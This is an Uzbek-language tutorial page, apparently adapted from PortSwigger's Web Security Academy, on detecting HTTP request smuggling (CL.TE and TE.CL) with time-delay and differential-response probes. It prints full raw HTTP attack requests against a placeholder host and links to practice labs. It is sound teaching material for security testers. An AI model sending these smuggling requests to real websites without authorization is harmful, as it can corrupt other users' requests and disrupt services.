# Topish

Bu bo'limda HTTP Request Smuggling zaifliklarini topishning bir qancha usullarini ko'rsatamiz.

## <mark style="color:yellow;">HTTP Request Smuggling zaifliklarini time delay orqali topish</mark> <a href="#http-request-smuggling-zaifliklarini-vaqt-kechiktirishlari-orqali-topish" id="http-request-smuggling-zaifliklarini-vaqt-kechiktirishlari-orqali-topish"></a>

HTTP Request Smuggling zaifliklarini aniqlashning eng samarali usuli, agar zaiflik mavjud bo'lsa, websayt responsida yuklanish vaqtni kechiktiradigan so'rovlarni yuborishdir. Ushbu usul Burp Scanner tomonidan Request Smuggling zaifliklarni aniqlashni avtomatlashtirish uchun qo'llaniladi.

## <mark style="color:yellow;">CL.TE zaifliklarini time delay orqali topish</mark> <a href="#clte-zaifliklarini-vaqt-kechiktirishlari-orqali-topish" id="clte-zaifliklarini-vaqt-kechiktirishlari-orqali-topish"></a>

Agar web saytda CL.TE zaifligi mavjud bo'lsa, unda quyidagi request time delay bilan amalga oshadi:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Frontend server `Content-Length` dan foydalanganligi sababli, so'rovning faqat bir qisminigina yuboradi va `X` olib tashlanadi. Backend server `Transfer-Encoding` headeridan foydalanadi u birinchi bo'lakni qabul qiladi va ikkinchi bo'lakni kutadi. Shu sababdan time delay kuzatiladi.

## <mark style="color:yellow;">TE.CL zaifliklarini time delay orqali topish</mark> <a href="#tecl-zaifliklarini-vaqt-kechiktirishlari-orqali-topish" id="tecl-zaifliklarini-vaqt-kechiktirishlari-orqali-topish"></a>

Agar web saytda TE.CL zaifligi mavjud bo'lsa, unda quyidagi so'rov time delay bilan amalga oshadi:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Frontend server `Transfer-Encoding` headeridan foydalanadi va u faqatgina so'rovning bir qisminigina yuboradi, `X` esa olib tashlanadi. Back-end server `Content-Length` headeridan foydalanadi, so'rov tanasida ko'proq kontentni kutadi va qolgan kontent kelishini kutadi. Shu sababdan kechikishlar kuzatiladi.

{% hint style="info" %}
**Eslatma:**

TE.CL zaifligini test qilayotganingizda agar web sayt CL.TE ga zaif bo'lsa unda web saytdagi boshqa foydalanuvchilarga ham ta'sir etishi mumkin. Ushbu holatni oldini olish uchun oldin CL.TE zaifligiga test qilib ko'rib uning muvaffaqiyatsiz ekanligiga ishonch hosil qilib keyin TE.CL zaifligiga test qiling.
{% endhint %}

## <mark style="color:yellow;">Turli responselar orqali HTTP request smuggling zaifliklarini tasdiqlash</mark> <a href="#http-request-smuggling-zaifliklarini-har-xil-response-lar-orqali-qabul-qilish" id="http-request-smuggling-zaifliklarini-har-xil-response-lar-orqali-qabul-qilish"></a>

Request Smuggling zaifligi ehtimoli aniqlanganda, website responsening javoblar tarkibida turli farqlarni yuzaga keltirish orqali zaiflik bor yo'qligi haqida dalilga erisha olasiz. Bu web saytga ketma-ket ikkita so'rov yuborishni o'z ichiga oladi:

* Keyingi so'rovni qayta ishlashga xalaqit berishga mo'ljallangan "xujum" so'rovi.
* "normal" so'rov

Agar "normal" so'rovning response kutilgan tarkibni o'z ichiga olgan bo'lsa, zaiflik tasdiqlanadi.

Masalan quyidagi normal so'rovga qarang:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Ushbu reqest so'rov natijalari bilan 200 status kodli normal HTTP response qabul qiladi.

Bu soʻrovni buzish uchun zarur boʻlgan hujum requesti,  CL.TE va TE.CL request smugglinga bog'liq.

## <mark style="color:yellow;">Turli responselar orqali CL.TE zaifliklarini tasdiqlash</mark> <a href="#har-xil-javoblar-yordamida-clte-zaifliklarini-tasdiqlash" id="har-xil-javoblar-yordamida-clte-zaifliklarini-tasdiqlash"></a>

CL.TE zaifliklarini aniqlashingiz uchun quyidagicha xujum uyushtirishingiz zarur:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

Agarda xujum muvaffaqiyatli yakunlansa, pastdagi oxirgi ikki qatorni backend keyingi so'rov deb qabul qiladi. Bu esa "normal" so'rovga ta'sir o'tkazishga sabab bo'ladi:

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Bu soʻrovda yaroqsiz URL manzil borligi uchun server 404 status kod bilan javob beradi, bu esa xujum soʻrovi haqiqatan ham unga xalaqit berganligini koʻrsatadi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [HTTP request smuggling, Turli responselar orqali CL.TE zaifliklarini tasdiqlash <mark style="color:yellow;"></mark> ≫](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)
{% endhint %}

## <mark style="color:yellow;">Turli responselar orqali TE.CL zaifliklarini tasdiqlash</mark> <a href="#har-xil-javoblar-yordamida-tecl-zaifliklarini-tasdiqlash" id="har-xil-javoblar-yordamida-tecl-zaifliklarini-tasdiqlash"></a>

TE.CL zaifliklarini aniqlashingiz uchun quyidagicha xujum uyushtirishingiz zarur:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

{% hint style="info" %}
**Eslatma:**

Ushbu so'rovni Burp Repeaterdan orqali yuborishingiz uchun, Repeater menusidan "Update Content-Length" xususiyatini o'chirishingiz zarur.

0 gacha `\r\n\r\n` ketma-ketligini kiritishingiz kerak.&#x20;
{% endhint %}

Agar hujum muvaffaqiyatli bo'lsa, `GET /404` dan boshlab hammasi backend server tomonidan qabul qilingan keyingi so'rovga tegishli sifatida ko'rib chiqiladi. Natijada, mana bu oddiy so'rov quyidagicha ko'rinadi:

```http
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Bu soʻrovda yaroqsiz URL manzil borligi uchun server 404 status kodi bilan javob beradi, bu esa xujum soʻrovi haqiqatan ham unga xalaqit berganini koʻrsatadi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [HTTP request smuggling, turli responselar orqali TE.CL zaifliklarini tasdiqlash ≫](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
{% endhint %}

{% hint style="info" %}
**Eslatma:**

Request Smuggling zaifligini boshqa requestlarga aralashish orqali tasdiqlashga urinayotganda ba'zi muhim narsalarni yodda tutish kerak:

* "Xujum" requesti va "oddiy" request turli tarmoqlarga ulangan holda serverga yuborilishi kerak. Ikkala requestni ham bitta tarmoq orqali yuborganda zaiflikni tasdiqlab bo'lmaydi.&#x20;
* "Xujum" requesti va "oddiy" request imkon qadar bir xil URL va parametr nomlaridan foydalanishi kerak. Buning sababi shundaki, ko'plab zamonaviy web saytlar front-end requstlarini URL va parametrlar asosida turli serverlarga yo'naltiradi. Xuddi shu URL va parametrlardan foydalanish so'rovlarning bir xil server tomonidan qayta ishlanishi ehtimolini oshiradi, bu xujum samarali bo'lishi uchun zarurdir.
* "Xujum" request orqali biror aralashuvni aniqlash uchun "oddiy" requestni yuborayotganingizda,  sayt bir vaqtning o'zida qabul qilayotgan boshqa so'rovlar,(boshqa foydalanuvchilarning so'rovlari) bilan ham requestni kim birinchi yuborishga raqobatlashayot bo'lasiz. "Xujum" so'rovidan so'ng "oddiy" so'rovni  darhol yuborishingiz kerak. Agar sayt band bo'lsa, zaiflikni tasdiqlash uchun bir necha marta urinib ko'rishingiz kerak bo'lishi mumkin.
* Ba'zi web saytlarda front-end server load balancer vazifasini bajaradi va ba'zi lod balancer algoritmiga muvofiq so'rovlarni turli xil backend tizimlarga yo'naltiradi. Agar sizning "xujum" va "oddiy" so'rovlaringiz turli xil backend tizimlarga yo'naltirilsa, xujum muvaffaqiyatsiz bo'ladi.&#x20;
* Agar sizning xujumingiz keyingi so‘rovga xalaqit bersayu, lekin siz aralashuvni aniqlash uchun yuborgan “oddiy” so‘rov bo‘lmasa, bu sizning xujumingizdan boshqa web sayt foydalanuvchisiga ta’sir qilganligini anglatadi. Tekshirishni davom etsangiz, bu boshqa foydalanuvchilarga tasir qilishi mumkin, ehtiyot bo'lishingiz kerak.
{% endhint %}

{% hint style="info" %}
Batafsil o'qish:

[HTTP request smuggling zaifliklaridan foydalanish ☰](foydalanish.md)
{% endhint %}
